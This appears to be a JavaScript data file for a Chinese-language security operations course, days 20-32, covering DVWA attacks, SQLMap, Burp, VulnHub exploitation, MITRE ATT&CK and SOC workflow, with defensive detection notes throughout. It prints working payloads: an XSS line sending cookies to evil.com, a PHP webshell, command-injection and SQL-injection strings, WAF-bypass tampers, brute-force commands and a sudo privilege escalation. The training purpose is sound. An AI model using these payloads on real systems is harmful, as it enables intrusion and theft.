/* ============================================================
   data-days-20-32.js — 92 天路线 · Day 20-32 逐日详解
   挂载进模块 8（初级安全运营 · 92天路线）
   ============================================================ */
(function () {
  const L = [];
  const add = (o) => L.push(o);

  /* ---------- Day 20 ---------- */
  add({
    id: 'd20', module: 8, ico: '💉', title: 'Day 20：SQL 注入 Medium/High + SQLMap',
    subtitle: '级别越高防得越好，绕过思路也越清晰', minutes: 150, tags: ['DVWA', 'SQLMap', 'Day20'],
    content: [
      { type: 'p', html: '昨天 Low 手工注入打通了，今天看 <b>Medium/High 级别防在哪里、怎么绕</b>，最后用 SQLMap 把全流程自动化。' },
      { type: 'h', text: 'Medium：下拉框 + 转义，怎么办' },
      { type: 'p', html: '页面把 id 变成下拉框，你以为不能改了？——<b>用 Burp 拦截改包</b>：抓到请求后把 <code>id=2</code> 改成 <code>id=1 OR 1=1</code> 重放。服务端对输入做了 <code>mysql_real_escape_string</code>，但 id 在 SQL 里<b>没有引号包裹</b>（数字型），转义根本不起作用——这就是"数字型注入"。' },
      { type: 'h', text: 'High：Session 里查，为什么依然能打' },
      { type: 'p', html: 'High 把查询挪到 Session 里执行，页面表单和实际查询"分离"。但注入点没变——照样在 id 参数注入，只是结果通过另一张页面回显（用 Burp 同时改两个请求）。学到的道理：<b>位置变了，根因没变</b>。' },
      { type: 'h', text: 'SQLMap 自动化（对比手工）' },
      { type: 'code', text: 'sqlmap --version\n# 从浏览器 F12 → Application → Cookies 拿 PHPSESSID\nsqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \\\n  --cookie="PHPSESSID=你的session; security=low" --batch\nsqlmap -u "..." --cookie="..." --dbs --batch        # 列库\nsqlmap -u "..." --cookie="..." -D dvwa --tables --batch   # 列表' },
      { type: 'callout', ico: '🧠', kind: 'mind', title: '今日笔记要点', html: '① 数字型 vs 字符型注入的绕过差异 ② "防御要修在根因上"（High 的分离没修根因）③ SQLMap 每个参数干了什么（对照手工六步）' },
      { type: 'h', text: '常见坑' },
      { type: 'ul', items: [
        'Cookie 忘带 <code>security=medium</code> → 测的还是 Low',
        'SQLMap 卡在确认提示 → 加 <code>--batch</code> 自动选默认',
        'Burp 改包后页面空白 → 检查请求是不是缺了 CSRF 参数',
      ]},
    ],
    takeaways: ['数字型注入：转义挡不住，因为输入不进引号', 'High 的"表单与查询分离"不修根因，Burp 两请求照样打', 'SQLMap = 手工六步的自动化，参数要能对应上'],
    checks: [
      { q: 'Medium 级别 id 参数为什么转义无效？', opts: ['转义函数失效了', 'id 在 SQL 中无引号包裹（数字型）', 'MySQL 版本太老', '用户权限高'], a: 1, ex: '数字型注入直接拼接数字位，mysql_real_escape_string 只处理引号内内容。' },
      { q: 'SQLMap 指定目标数据库的参数是？', opts: ['--db', '-D 库名', '--database', '--schema'], a: 1, ex: '-D 指定库，-T 指定表，配合 --tables/--dump 使用。' },
    ],
  });

  /* ---------- Day 21 ---------- */
  add({
    id: 'd21', module: 8, ico: '⚡', title: 'Day 21：XSS 反射/存储 + 三种类型',
    subtitle: '弹窗只是开始——偷 Cookie、挂马、键盘记录才叫危害', minutes: 130, tags: ['DVWA', 'XSS', 'Day21'],
    content: [
      { type: 'p', html: '今天把 XSS 从"会弹窗"打到"理解危害链"，并把三种类型（反射/存储/DOM）的边界分清。' },
      { type: 'h', text: '反射型（Reflected）' },
      { type: 'code', text: "<script>alert('XSS')</script>\n<img src=x onerror=alert(document.cookie)>   # 直接偷 Cookie\n<script>location='http://evil.com/steal?c='+document.cookie</script>  # 外带" },
      { type: 'h', text: '存储型（Stored）：危害最大的' },
      { type: 'p', html: '在留言板提交 Payload → 脚本永久入库 → <b>每个访问者都中招</b>。真实世界的存储 XSS = 挂马 + 键盘记录 + 挖矿脚本注入，是"以打点为跳板打客户"的经典链路。' },
      { type: 'h', text: 'Medium/High 绕过思路' },
      { type: 'code', text: 'Medium 把 <script> 整体删除（不区分大小写）但只删一次：\n  <scr<script>ipt>alert(1)</scr</script>ipt>   # 拼回来\nHigh 用 htmlspecialchars 转义了引号与尖括号：\n  → 默认注入点废了，但 name 参数是"按位替换"可绕（Strtolower+字符串操纵）\n  → 思考：为什么"输出编码"比"输入过滤"更可靠？' },
      { type: 'callout', ico: '🛡️', kind: 'tip', title: '防守方视角（写进笔记）', html: '检测：请求/存储内容出现 <code>&lt;script、onerror=、javascript:</code> 特征 → 告警；防护：<b>输出编码 + CSP</b> 是根治组合，输入过滤只是缓解。' },
      { type: 'h', text: '常见坑' },
      { type: 'ul', items: [
        'alert 没弹 = 看 F12 Console 有没有被 CSP 拦（新版浏览器对某些上下文有限制）',
        '存储型打完记得清掉留言（不然自己每次访问都弹）——站内笔记"重置XSS的方法.txt"就是干这个的',
      ]},
    ],
    takeaways: ['存储型 > 反射型（持久化打所有访问者）', '绕过输入过滤的核心：观察过滤规则再针对性变形', '根治靠输出编码+CSP，不是黑名单过滤'],
    checks: [
      { q: '危害最大的 XSS 类型？', opts: ['反射型', '存储型', 'DOM 型', '都一样'], a: 1, ex: '存储型持久化生效，打所有访问者，常被用于挂马/盗号。' },
      { q: '防 XSS 的根治组合？', opts: ['输入黑名单过滤', '输出编码 + CSP', '换浏览器', '加 HTTPS'], a: 1, ex: '输出编码保证"数据不当代码执行"，CSP 限制脚本来源，双保险。' },
    ],
  });

  /* ---------- Day 22 ---------- */
  add({
    id: 'd22', module: 8, ico: '📤', title: 'Day 22：文件上传 + 命令注入',
    subtitle: 'Webshell 落地与命令拼接——两个"直接拿权限"的洞', minutes: 120, tags: ['DVWA', 'Webshell', 'Day22'],
    content: [
      { type: 'p', html: '今天两个漏洞的共同点：<b>成功即拿 shell</b>。重点不是弹指一挥的 Payload，而是理解"服务端校验为什么形同虚设"和"真实防御该怎么做"。' },
      { type: 'h', text: '文件上传：三级校验三级绕过' },
      { type: 'table', head: ['级别', '服务端校验', '绕过方式'], rows: [
        ['Low', '无校验', '直接传 shell.php'],
        ['Medium', '查 Content-Type', 'Burp 把 Content-Type 改成 image/jpeg'],
        ['High', '查扩展名/文件头', 'shell.php.jpg、%00 截断、图片马+文件包含'],
      ]},
      { type: 'code', text: 'shell.php: <?php system($_GET["cmd"]); ?>\n上传后访问: http://localhost/dvwa/hackable/uploads/shell.php?cmd=whoami\n再试: ?cmd=cat /etc/passwd ; uname -a' },
      { type: 'h', text: '命令注入：拼接的艺术' },
      { type: 'code', text: '127.0.0.1; whoami          # 分号连接\n127.0.0.1 && cat /etc/passwd\n127.0.0.1 | dir            # Windows 下用 dir\nLow 的根因：str_replace 只删了 "; " 两种写法' },
      { type: 'callout', ico: '🛡️', kind: 'tip', title: '防守方视角（重点）', html: '文件上传检测：<b>上传目录新增可执行文件 = 顶级告警</b>；命令注入检测：Web 日志参数含 <code>; | &amp;&amp; %0a</code> 连接符 + Web 进程拉起系统命令（EDR 父进程链）。这两个检测思路直接写进你的 SIEM 规则库。' },
    ],
    takeaways: ['三级校验三级绕过：无校验/Content-Type/扩展名', '上传防御核心：白名单+目录禁执行', '命令注入检测：参数连接符 + 进程链异常'],
    checks: [
      { q: '防文件上传最可靠的一条？', opts: ['前端 JS 校验后缀', '服务端白名单+上传目录禁执行', '改文件名', '限制大小'], a: 1, ex: '前端校验一秒绕过；"目录不可执行"让即使传上去也弹不起来。' },
      { q: 'Low 级命令注入只删了 "; "，用哪个还能打？', opts: ['&& 或 |', '分号加空格', '引号', '注释'], a: 0, ex: '黑名单式过滤永远有漏网连接符，白名单校验输入格式才是正解。' },
    ],
  });

  /* ---------- Day 23 ---------- */
  add({
    id: 'd23', module: 8, ico: '🔄', title: 'Day 23：CSRF + 暴力破解',
    subtitle: ' CSRF Token 的攻与防 · Burp Intruder/Hydra 爆破', minutes: 110, tags: ['DVWA', 'CSRF', '爆破', 'Day23'],
    content: [
      { type: 'p', html: 'CSRF 是"借刀杀人"：不偷密码，借你浏览器里的登录状态干坏事。爆破则是最古老也最常见的话术之外的暴力美学。' },
      { type: 'h', text: 'CSRF：Token 缺失 = 全裸' },
      { type: 'code', text: '# Low：改密码请求没有任何校验\nhttp://localhost/dvwa/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change#\n# 构造诱导链接发给"已登录的用户"，点开即改密' },
      { type: 'h', text: 'Medium/High：Token 登场与攻防升级' },
      { type: 'ul', items: [
        'Medium 加了 <code>user_token</code> 校验 → 攻击者拿不到当前 Token（跨域读取受限）',
        '但 High 之前 Token 校验与 Referer 校验存在逻辑漏洞：可从 Referer 里抠 Token（<code>$_SERVER[\'HTTP_REFERER\']</code> 里含 Token 的写法）',
        '学到：<b>防御逻辑本身也要审——"加了防御"和"防对了"是两回事</b>',
      ]},
      { type: 'h', text: '暴力破解：Burp Intruder 实操' },
      { type: 'code', text: '# Burp 抓登录包 → 右键 Send to Intruder\nPositions: 清空默认标记，只给 password 参数加 §\nPayloads: Load /usr/share/wordlists/rockyou.txt（前 1000 行先试）\nStart attack → 按 Length 排序 → 长度不同的那条就是正确密码\n\n# Hydra 命令行版（Kali）\nhydra -l admin -P 密码字典.txt localhost http-get-form "/路径/:user=^USER^&pass=^PASS^:F=失败特征:H=Cookie: xxx"' },
      { type: 'callout', ico: '🛡️', kind: 'tip', title: '防守方视角', html: 'CSRF 检测：Referer 缺失/异常的敏感操作请求。爆破检测：<b>同源高频失败 + 失败后成功</b>（最危险信号）。这两个检测规则请直接写进你的 SIEM 笔记。' },
    ],
    takeaways: ['CSRF 的本质是"借登录状态"，Token+SameSite 是解', 'High 级 Referer 校验仍可被抠 Token——防御逻辑要审', '爆破检测黄金信号：失败洪峰 + 失败后成功'],
    checks: [
      { q: 'CSRF 成功的前提条件？', opts: ['攻击者知道密码', '受害者已登录且点击了诱导链接', '服务器有漏洞', '用了 HTTPS'], a: 1, ex: 'CSRF 借的是浏览器自动携带的登录 Cookie，前提是受害者已登录。' },
      { q: 'Burp Intruder 里判断"爆破成功"最常用的指标？', opts: ['状态码', '响应长度差异', '时间', 'IP'], a: 1, ex: '错误提示长度一致，成功响应长度不同——按 Length 排序秒找。' },
    ],
  });

  /* ---------- Day 24 ---------- */
  add({
    id: 'd24', module: 8, ico: '🧾', title: 'Day 24：DVWA 综合复习 + 防御方案撰写',
    subtitle: '把一周的攻击转成"防守方知识资产"——项目 3 报告主体', minutes: 90, tags: ['DVWA', '总结', 'Day24'],
    content: [
      { type: 'p', html: '今天不学新东西，把 Day 15-23 的攻击<b>翻译成防守方的语言</b>。产出直接用于简历项目 3 的报告主体。' },
      { type: 'h', text: '逐漏洞整理（六件套模板）' },
      { type: 'code', text: '每个漏洞按此模板写：\n① 复现步骤（可重放，含 Payload）\n② 三级别对比（Low/Medium/High 防御差异与绕过）\n③ 危害评估（拿什么权限、影响什么数据）\n④ 防御方案（根治方案优先）\n⑤ 检测方法（哪个日志、什么特征）\n⑥ 风险等级（高/中/低 + 理由）' },
      { type: 'h', text: '核心思考题（想清楚 = 初级毕业）' },
      { type: 'ul', items: [
        '为什么"输入过滤"总被绕过，而"参数化查询/输出编码"很难绕？',
        '六个漏洞里，哪三个最容易被日志检测发现？为什么？（提示：看它们是否产生明显的请求特征）',
        '如果只能部署一台安全设备（WAF），能挡住哪几个？挡不住的靠什么补？',
      ]},
      { type: 'callout', ico: '📄', kind: 'tip', title: '产出', html: '把六件套整理成 Markdown（这就是项目 3 报告主体），加上环境搭建章节和截图，报告就完成了 80%。第 5 课的简历文案可以直接引用。' },
    ],
    takeaways: ['六件套模板：复现/对比/危害/防御/检测/定级', '根治方案（参数化/编码/白名单）优于过滤', '每个攻击特征都该变成一条检测规则'],
    checks: [
      { q: '六个漏洞中哪个最难被日志检测发现？', opts: ['SQL 注入', '存储型 XSS', 'CSRF（诱导发生在受害者浏览器）', '暴力破解'], a: 2, ex: 'CSRF 的攻击请求来自受害者浏览器且带合法 Cookie，服务器日志与正常请求无异——检测靠 Referer 与操作序列。' },
    ],
  });

  /* ---------- Day 25 ---------- */
  add({
    id: 'd25', module: 8, ico: '💉', title: 'Day 25：SQL 注入深入——四种注入类型',
    subtitle: '联合/报错/布尔盲注/时间盲注：页面不回显怎么办', minutes: 100, tags: ['SQL注入', 'Day25'],
    content: [
      { type: 'p', html: 'Low 的 UNION 注入靠"页面回显数据"。真实世界多数注入点<b>不回显数据</b>——这时靠报错、靠布尔差异、靠时间延迟让数据库"开口说话"。' },
      { type: 'h', text: '报错注入：让错误信息泄露数据' },
      { type: 'code', text: "1' AND extractvalue(1, concat(0x7e, (SELECT database()), 0x7e))--\n# extractvalue 对 ~ 开头的路径报 XPATH 语法错误，错误信息里带出查询结果" },
      { type: 'h', text: '布尔盲注：一问一答猜数据' },
      { type: 'code', text: "1' AND (SELECT LENGTH(database()))=4--    # 页面正常=真，异常=假\n1' AND (SELECT ASCII(SUBSTR(database(),1,1)))=100--   # 逐字符二分猜\n# 'dvwa' 的 d=100 ✓ → 继续猜第二位……" },
      { type: 'h', text: '时间盲注：连页面差异都没有时' },
      { type: 'code', text: "1' AND IF(ASCII(SUBSTR(database(),1,1))>100, SLEEP(5), 0)--\n# 响应慢 5 秒=真。靠时间延迟传递 0/1 信号，脚本自动化逐字符猜" },
      { type: 'callout', ico: '🧠', kind: 'mind', title: '理解本质', html: '四种类型只是<b>"取回数据的方式"不同</b>：回显直接看、报错看错误、布尔看页面差异、时间看响应延迟。SQLMap 的全自动化本质就是把这四种"问法"编排成脚本。' },
      { type: 'callout', ico: '🛡️', kind: 'tip', title: '防守方视角', html: '检测盲注：<b>同源高频、内容相似、响应时长异常</b>的请求序列（SLEEP 注入会产生规律性的慢响应）——这是 NDR/应用性能监控能抓的特征。' },
    ],
    takeaways: ['四类型 = 回显/报错/布尔/时间，四种"让数据库传话"的方式', '盲注靠逐字符猜，自动化是必然', '时间盲注留下"规律性慢响应"的检测特征'],
    checks: [
      { q: '布尔盲注的判断依据？', opts: ['弹窗', '页面正常/异常两种状态', '报错内容', '状态码 500'], a: 1, ex: '构造恒真/恒假条件，通过页面两种状态逐位猜数据。' },
      { q: '时间盲注在流量上的检测特征？', opts: ['无特征', '同源请求规律性慢响应', '全是 404', '流量翻倍'], a: 1, ex: 'SLEEP 型注入产生周期性慢响应，配合同源高频即可命中。' },
    ],
  });

  /* ---------- Day 26 ---------- */
  add({
    id: 'd26', module: 8, ico: '🤖', title: 'Day 26：SQLMap 高级用法',
    subtitle: '从 --dbs 到 --os-shell · tamper 绕过 · 自定义请求', minutes: 90, tags: ['SQLMap', 'Day26'],
    content: [
      { type: 'p', html: '昨天手动理解了原理，今天让 SQLMap 把整个流程自动化，并学会它的高级姿势。' },
      { type: 'h', text: '常用参数速查（跟着跑一遍）' },
      { type: 'code', text: 'sqlmap -u "URL" --cookie="..." --batch\n  --dbs                    # 列库\n  -D dvwa --tables         # 列表\n  -D dvwa -T users --columns --dump   # 拖数据\n  --current-user --is-dba  # 当前用户/是否管理员\n  --sql-query="SELECT version()"     # 自定义查询\n  --os-shell               # 拿操作系统 shell（需写权限+secure_file_priv 配置）' },
      { type: 'h', text: 'tamper：绕 WAF 的变形器' },
      { type: 'code', text: 'sqlmap -u "..." --tamper=space2comment   # 空格 → /**/\n# 思路：WAF 拦"UNION SELECT"，变形成"UNION/**/SELECT" 绕过特征\n# tamper 脚本 = 你的攻击特征知识反过来用：WAF 规则也这么写' },
      { type: 'h', text: 'POST 请求与自定义' },
      { type: 'code', text: '# 方法1：--data 直接带 POST 体\nsqlmap -u "http://.../login.php" --data="username=admin&password=test" --batch\n# 方法2：-r 从 Burp 保存的请求文件读（复杂请求首选）\nsqlmap -r request.txt --batch' },
      { type: 'callout', ico: '🛡️', kind: 'tip', title: '防守方视角', html: '把 SQLMap 的每类行为记成检测特征：批量探测期的规律性 404/报错、tamper 特征 <code>/**/</code>、--os-shell 阶段的文件写入。你今天研究的"怎么绕"，就是明天 WAF 规则的"怎么拦"。' },
    ],
    takeaways: ['-r 读 Burp 请求文件是最实用的注入方式', 'tamper 本质是特征变形，攻防同源', '--os-shell 的前提是 secure_file_priv 与写权限'],
    checks: [
      { q: '复杂请求（多 Cookie+Referer）注入首选方式？', opts: ['-u 拼 URL', '-r 读 Burp 请求文件', '--data 猜', '手工'], a: 1, ex: '-r 原样复用完整请求，最不易漏头。' },
      { q: 'space2comment 的作用？', opts: ['压缩空格', '空格替换为 /**/ 绕特征', '注释代码', '加速'], a: 1, ex: '把空格变形为注释符，WAF 特征匹配不上但数据库语义不变。' },
    ],
  });

  /* ---------- Day 27 ---------- */
  add({
    id: 'd27', module: 8, ico: '🧰', title: 'Day 27：Burp Suite 基础',
    subtitle: 'Proxy/Repeater/Intruder —— Web 手工测试三大件', minutes: 90, tags: ['Burp', 'Day27'],
    content: [
      { type: 'p', html: 'Burp Suite 是 Web 安全的"手术台"。今天把配置和三大核心模块练熟——以后所有 Web 测试都靠它。' },
      { type: 'h', text: '代理配置（一次性）' },
      { type: 'code', text: 'Firefox → 设置 → 网络设置 → 手动代理：127.0.0.1:8080\nBurp → Proxy → Proxy settings → 确保 8080 监听中\n# 访问 http:// 目标即可被拦截（HTTPS 需装 Burp 证书：访问 http://burp 下载 CA）' },
      { type: 'h', text: '三大模块练法' },
      { type: 'table', head: ['模块', '干什么', '练习任务'], rows: [
        ['Proxy 拦截', '截住请求改内容', '拦截 DVWA 登录请求，把用户名改成 admin\'--'],
        ['Repeater 重放', '反复改一个请求观察响应', '把 SQL 注入 Payload 逐条重放对比'],
        ['Intruder 爆破', '自动化批量发变体请求', '对登录接口跑 100 个密码（Sniper 模式）'],
      ]},
      { type: 'callout', ico: '🧠', kind: 'mind', title: '知识点：请求包结构', html: '在 Repeater 里看懂一个请求的解剖：<b>请求行（方法+路径）→ 头（Host/Cookie/User-Agent）→ 空行 → 体（POST 参数）</b>。以后所有 Web 漏洞分析都在这个结构上进行。' },
      { type: 'callout', ico: '🛡️', kind: 'tip', title: '防守方视角', html: 'WAF 日志里每条拦截记录的"请求详情"，就是 Burp 拦截包的镜像。看得懂 Burp 请求包 = 看得懂 WAF 误报分析。' },
    ],
    takeaways: ['Proxy 拦截 / Repeater 重放 / Intruder 批量是三大件', 'HTTPS 站点要先装 Burp CA 证书', '请求包结构：请求行→头→体'],
    checks: [
      { q: '反复修改同一个请求观察不同响应，用哪个模块？', opts: ['Proxy', 'Repeater', 'Intruder', 'Decoder'], a: 1, ex: 'Repeater 就是"手工重放台"，改一点看一点。' },
      { q: 'Intruder 爆破时按什么快速定位成功请求？', opts: ['状态码都是 200 时按响应长度', '按时间', '按 IP', '随机'], a: 0, ex: '登录失败提示长度固定，成功响应长度不同——Length 排序秒定位。' },
    ],
  });

  /* ---------- Day 28 ---------- */
  add({
    id: 'd28', module: 8, ico: '🎯', title: 'Day 28：VulnHub 靶机入门——信息收集',
    subtitle: '从"一个 IP"开始的标准流程', minutes: 110, tags: ['VulnHub', '信息收集', 'Day28'],
    content: [
      { type: 'p', html: 'DVWA 是"指定漏洞练手法"，VulnHub 靶机是"只给一台机器自己找路"——更接近真实渗透。今天只做第一阶段：信息收集。' },
      { type: 'h', text: '准备' },
      { type: 'code', text: '# vulnhub.com 下载 Easy 靶机（推荐 Kioptrix Level 1 或 DC-1）\n# VirtualBox/VMware 导入运行（网络设为与 Kali 同网段）' },
      { type: 'h', text: '信息收集标准流程' },
      { type: 'code', text: 'ip a                                  # 确认自己网段（如 192.168.56.x）\nnmap -sn 192.168.56.0/24              # 扫存活主机\nnmap -sV -sC -O 靶机IP                 # 版本+脚本+系统 全面扫\nnmap -p- 靶机IP                        # 全端口（65535 个，慢但全）\ngobuster dir -u http://靶机IP -w /usr/share/wordlists/dirb/common.txt   # 目录扫描' },
      { type: 'table', head: ['Nmap 输出', '含义', '下一步'], rows: [
        ['22/tcp open ssh OpenSSH 4.7', 'SSH 服务，版本老', 'searchsploit OpenSSH 4.7'],
        ['80/tcp open http Apache', '有网站', '浏览器访问+目录扫描'],
        ['139/445 netbios/smb', 'Samba 文件共享', 'enum4linux / 空-session 探测'],
      ]},
      { type: 'callout', ico: '📓', kind: 'tip', title: '记录纪律', html: '从今天起建 <code>靶机名-notes.md</code>：每条命令 + 发现 + 思考。渗透测试报告的能力就是从记录习惯开始的——Day 29 会直接续用。' },
      { type: 'callout', ico: '🛡️', kind: 'tip', title: '防守方视角', html: 'nmap -sn 全网段扫描在网络流量上非常显眼（ICMP/ARP 风暴）——这就是 NDR"内网扫描行为"告警的来源。攻击者怎么扫，你就怎么检测。' },
    ],
    takeaways: ['-sn 找活、-sV -sC 看详情、-p- 扫全端口、gobuster 扫目录', '每个开放端口都对应下一步动作', '从今天开始建靶机笔记文档'],
    checks: [
      { q: '确认网段内存活主机的 Nmap 参数？', opts: ['-sV', '-sn', '-O', '-p-'], a: 1, ex: '-sn = ping 扫描不做端口探测，快速找活。' },
      { q: '发现 80 端口开放后的合理下一步？', opts: ['直接关机', '浏览器访问+gobuster 目录扫描', '重启靶机', '跳过'], a: 1, ex: 'Web 服务先看内容再扫目录，信息收集步步为营。' },
    ],
  });

  /* ---------- Day 29 ---------- */
  add({
    id: 'd29', module: 8, ico: '💣', title: 'Day 29：VulnHub 靶机——漏洞利用与 Getshell',
    subtitle: 'searchsploit · 利用公开漏洞 · 初步提权', minutes: 110, tags: ['VulnHub', '提权', 'Day29'],
    content: [
      { type: 'p', html: '昨天收集了信息，今天把"信息"变成"权限"。标准链路：<b>搜公开漏洞 → 利用 → 拿 shell → 提权侦察</b>。' },
      { type: 'h', text: '搜漏洞与利用' },
      { type: 'code', text: 'searchsploit samba 3.0.20        # 按服务+版本搜公开 EXP\nsearchsploit -m 16320            # 复制指定 EXP 到当前目录\n# 按 EXP 说明执行（有的是 python 脚本，有的是 metasploit 模块）' },
      { type: 'h', text: '拿到 shell 后的提权侦察三连' },
      { type: 'code', text: 'id; whoami; uname -a             # 我是谁/什么系统\nsudo -l                          # 能免密 sudo 什么（提权金矿）\nfind / -perm -4000 -type f 2>/dev/null   # SUID 文件（对照 GTFOBins）\ncat /etc/crontab                 # 定时任务（计划任务提权）' },
      { type: 'callout', ico: '🧠', kind: 'mind', title: 'GTFOBins 是什么', html: '<b>gtfobins.github.io</b>：查询"哪些合法程序能被用来提权"的数据库。sudo -l 显示能 sudo vim → 查 GTFOBins → <code>sudo vim -c \':!sh\'</code> 直接变 root。中级课会系统学提权。' },
      { type: 'callout', ico: '🛡️', kind: 'tip', title: '防守方视角（Day 29 重点）', html: '复盘时记录：<b>哪些动作在日志里留痕</b>——nmap 扫描在流量/防火墙、爆破在 auth.log、EXP 利用 often 在服务崩溃记录、提权在 sudo 日志。这份"痕迹清单"就是你的检测规则库第一页。' },
    ],
    takeaways: ['searchsploit 按"服务+版本"搜公开 EXP', '提权侦察四连：id/uname/sudo -l/SUID+GTFOBins', '每个攻击动作都要记录"日志留痕点"'],
    checks: [
      { q: 'sudo -l 输出 "(root) NOPASSWD: /usr/bin/vim" 意味着？', opts: ['不能用', '可用 vim 提权到 root', 'vim 有漏洞', '需要密码'], a: 1, ex: '免密 sudo vim，查 GTFOBins 得 vim -c :!sh 直接提权。' },
      { q: '提权侦察里 SUID 全盘搜索的命令？', opts: ['find / -perm -4000', 'ls -la /', 'grep root', 'chmod 777'], a: 0, ex: '-perm -4000 即 SUID 位，配合 GTFOBins 查利用方式。' },
    ],
  });

  /* ---------- Day 30 ---------- */
  add({
    id: 'd30', module: 8, ico: '📕', title: 'Day 30：Web 安全阶段总结——攻击特征手册',
    subtitle: '把 15 天的攻击翻译成"检测规则库"——本阶段最重要的产出', minutes: 90, tags: ['总结', '检测', 'Day30'],
    content: [
      { type: 'p', html: '第二阶段收官。今天不摸键盘打靶，把所有攻击知识<b>翻译成防守方资产</b>——这份手册就是你以后写 SIEM 规则的底稿。' },
      { type: 'h', text: '攻击特征手册（完成并扩充它）' },
      { type: 'table', head: ['攻击', '日志/流量特征', '检测规则雏形'], rows: [
        ['SQL 注入', 'URL 参数含 \' union select -- 等；报错激增', 'WAF 规则 + 响应码 500 突增'],
        ['SQL 盲注', '同源高频、Payload 相似仅差一位', '同源高频 + 内容相似度聚类'],
        ['XSS', '参数含 <script/onerror/javascript:', 'WAF 规则 + CSP 上报'],
        ['暴力破解', '同源 401/403 洪峰 + 失败后成功', '频率阈值 + 序列规则'],
        ['目录扫描', '404 洪峰 + 路径字典特征', '404 基线告警'],
        ['文件上传/Webshell', '上传目录新增可执行文件', '文件监控 + 目录访问告警'],
        ['命令注入', '参数含 ; | && 连接符', 'WAF 规则 + EDR 进程链'],
      ]},
      { type: 'h', text: '自查三问（诚实回答）' },
      { type: 'ul', items: [
        '每个攻击的 Payload 我能默写吗？（不能就回去重打）',
        '每个攻击的"日志特征"我说得清吗？（说不清就翻回对应天的笔记）',
        '如果给我一份陌生 access.log，我能找出所有攻击吗？（找一份公开样本练手验证）',
      ]},
      { type: 'callout', ico: '🎓', kind: 'tip', title: '阶段毕业标准', html: '① DVWA 六模块三级别全通 ② 攻击特征手册完成 ③ 能在陌生日志里找出至少 3 类攻击。达标 → 进入 Day 31-32 的 ATT&CK 与 SOC 流程（通往"运营视角"的桥）。' },
    ],
    takeaways: ['攻击特征手册 = SIEM 规则的底稿，本阶段最重要产出', '三个自查问题达标才算阶段毕业', '从"会打"到"会检测"，翻译工作是关键'],
    checks: [
      { q: '攻击特征手册在安全运营中的用途？', opts: ['装饰简历', '作为 SIEM 检测规则的开发底稿', '给攻击者看', '没有用'], a: 1, ex: '每条日志特征就是一条规则的雏形——这就是运营的检测能力来源。' },
      { q: '盲注类攻击在流量中最有效的检测思路？', opts: ['看状态码', '同源高频+内容相似度聚类', '只看 IP', '无解'], a: 1, ex: '盲注逐字符猜会产生大量"相似但不相同"的请求，聚类即现形。' },
    ],
  });

  /* ---------- Day 31 ---------- */
  add({
    id: 'd31', module: 8, ico: '🧭', title: 'Day 31：MITRE ATT&CK 框架入门',
    subtitle: '把 30 天的攻击映射到行业通用语言', minutes: 100, tags: ['ATT&CK', 'Day31'],
    content: [
      { type: 'p', html: '前 30 天你会了一堆攻击手法，但每个团队对它们的叫法都不一样——ATT&CK 就是全行业的"普通话"。今天把你 30 天学的全部翻译过去。' },
      { type: 'h', text: '14 战术里先背 8 个（按攻击链顺序）' },
      { type: 'code', text: 'TA0001 初始访问 Initial Access      # 怎么进来的\nTA0002 执行 Execution               # 跑了什么\nTA0003 持久化 Persistence           # 怎么赖着\nTA0005 防御规避 Defense Evasion     # 怎么躲\nTA0006 凭证访问 Credential Access   # 怎么偷密码\nTA0007 发现 Discovery               # 怎么摸清环境\nTA0008 横向移动 Lateral Movement    # 怎么扩散\nTA0010 数据外泄 Exfiltration        # 怎么偷走' },
      { type: 'h', text: '把学过的攻击全部映射（练习产出）' },
      { type: 'table', head: ['你练过的攻击', 'ATT&CK 技术'], rows: [
        ['DVWA SQL 注入', 'T1190 利用面向公网的应用'],
        ['暴力破解 DVWA/SSH', 'T1110'],
        ['文件上传 Webshell', 'T1505.003'],
        ['计划任务持久化', 'T1053.005'],
        ['命令注入执行', 'T1059.004 Unix Shell'],
        ['XSS 偷 Cookie', 'T1539 窃取 Web 会话 Cookie'],
      ]},
      { type: 'callout', ico: '🧠', kind: 'mind', title: '为什么这课是分水岭', html: '从今天起你描述攻击必须带 T 编号："攻击者利用 T1190 进入，通过 T1505.003 建立持久化"。这句话任何安全团队都听得懂——<b>这就是专业化的开始</b>。' },
    ],
    takeaways: ['ATT&CK = 攻防通用语言，先背 8 大战术', '所有学过的攻击都能映射 T 编号（练习产出）', '从今天起描述攻击带 T 编号'],
    checks: [
      { q: 'T1505.003 是什么技术？', opts: ['暴力破解', 'Web Shell', '钓鱼', 'DDoS'], a: 1, ex: 'T1505.003 = Server Software Component 下的 Web Shell。' },
      { q: '攻击者"清日志"属于哪个战术？', opts: ['TA0005 防御规避', 'TA0003 持久化', 'TA0007 发现', 'TA0010 外泄'], a: 0, ex: '清日志为了躲检测，属于防御规避（也关联 T1070.001 清除事件日志）。' },
    ],
  });

  /* ---------- Day 32 ---------- */
  add({
    id: 'd32', module: 8, ico: '🏢', title: 'Day 32：SOC 工作流程与事件响应',
    subtitle: 'Tier 分级 · 告警→事件→事故 · NIST 四阶段 · MTTD/MTTR', minutes: 90, tags: ['SOC', '应急', 'Day32'],
    content: [
      { type: 'p', html: '技术学完了，今天回答一个问题：<b>"进入公司后，你每天到底干什么？"</b>——这就是 SOC 的运转流程。' },
      { type: 'h', text: '你的一天（Tier 1 视角）' },
      { type: 'code', text: '09:00 交接班：看昨夜未闭环告警与当日情报\n09:30 盯 SIEM 告警队列：逐条研判\n  ├ 真实 → 定性/定级/开工单升级 Tier2\n  └ 误报 → 归因（为什么误报）并记录\n14:00 处置辅助：按 Tier2 指示封禁/取证\n17:00 写日报：今日告警数/误报数/待办移交' },
      { type: 'h', text: '核心概念链（背下来）' },
      { type: 'ul', items: [
        '<b>告警 ≠ 事件 ≠ 事故</b>：SIEM 规则触发=告警；确认为真实攻击=事件；造成实际影响=事故',
        '<b>升级路径</b>：Tier 1 研判 → Tier 2 调查遏制 → Tier 3 逆向/狩猎',
        '<b>NIST 四阶段</b>：准备 → 检测分析 → 遏制/消除/恢复 → 复盘',
        '<b>两个指标</b>：MTTD（多久发现）/ MTTR（多久处置）——团队 KPI 就是它们',
      ]},
      { type: 'h', text: '场景演练（今天的大作业）' },
